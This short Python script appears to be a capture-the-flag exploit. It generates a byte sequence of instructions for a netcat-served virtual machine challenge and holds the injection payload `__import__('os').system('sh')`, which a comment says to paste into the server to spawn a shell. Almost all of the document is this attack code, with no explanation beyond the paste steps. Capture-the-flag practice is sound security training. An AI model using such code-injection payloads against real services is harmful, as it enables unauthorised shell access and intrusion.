

s = "__import__('os').system('sh')"


vm = b''


# VM string to input and output 30 chars. Copy paste to nc server, then copy paste above python snippet
swap = 0
for i in range(60):
    if (not swap):
        inp = 94 + 23 -i
        vm += bytes([inp])
    else:
        out = 94 + 5 -i
        vm += bytes([out])
    swap ^= 1
print(vm.decode())

